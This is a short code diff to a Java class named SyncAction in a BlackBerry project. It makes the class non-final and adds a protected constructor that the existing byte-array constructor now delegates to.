@@ -25,7 +25,7 @@ import blackberry.utils.WChar;
 /**
  * The Class SyncAction.
  */
-public final class SyncAction extends SubAction {
+public class SyncAction extends SubAction {
     // #debug
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
 
@@ -52,7 +52,7 @@ public final class SyncAction extends SubAction {
      *            the conf params
      */
     public SyncAction(final int actionId_, final byte[] confParams) {
-        super(actionId_);
+        this(actionId_);
         parse(confParams);
 
         // #ifdef DBC
@@ -73,6 +73,10 @@ public final class SyncAction extends SubAction {
     public SyncAction(final String host_) {
         super(ACTION_SYNC);
         host = host_;
+    }
+
+    protected SyncAction(int actionId) {
+        super(actionId);
     }
 
     /*
